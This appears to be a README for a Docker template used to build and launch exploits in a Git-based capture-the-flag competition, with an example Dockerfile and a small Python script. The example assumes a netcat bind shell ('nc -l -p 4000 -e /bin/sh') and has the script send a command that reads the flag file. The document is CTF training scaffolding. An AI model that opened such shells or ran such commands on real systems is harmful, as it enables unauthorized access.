# Exploit Docker Template

A Dockerfile template for building an exploit in Git-based CTF. An exploit in
Git-based CTF is a program running in a Docker container.

# Usage

You can modify the [`Dockerfile`](Dockerfile), and run the `setup.sh` script to
launch your exploit. In the Dockerfile, you should place your exploit script at
`/bin/exploit`. Once you invoke `./setup.sh [exploit name] [ip] [port]`, then
the script will launch the exploit against the service running at the given ip
and port. Your exploit script/program (`/bin/exploit`) should take both ip and
port number as command-line arguments: you should be able to run the exploit
with `/bin/exploit [ip] [port]`.

# Example

Below is an example that shows how you can create an exploit docker. We assume
that a simple shell service is running at port 4000: `nc -l -p 4000 -e /bin/sh`.

1. Modify the Dockerfile as follows.

    ```dockerfile
    FROM debian:latest

    # =========Install your package=========
    RUN apt-get update && apt-get install -y \
          make \
          gcc  \
          python
    # ======================================


    # ======Build and run your exploit=====
    COPY exploit /bin/

    # Specipy IP address
    ENTRYPOINT ["/bin/exploit", "127.0.0.1"]
    # ======================================
    ```

2. Create a python script `./exploit` and make it executable: `chmod +x
   ./exploit`. The script should look as follows:

    #### exploit
    ```python
    #!/usr/bin/env python

    from socket import *
    import sys

    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    BUFSIZE = 1024
    ADDR = (HOST, PORT)

    s = socket(AF_INET, SOCK_STREAM)
    try:
        s.connect(ADDR)
    except Exception as e:
        print('Cannot connect to the server.')
        sys.exit()

    s.send('cat /var/ctf/flag\n')
    flag = s.recv(BUFSIZE)
    flag = flag.rstrip()
    sys.stdout.write(flag)
    ```

3. Run the setup script: `./setup.sh exploit 127.0.0.1 4000`.
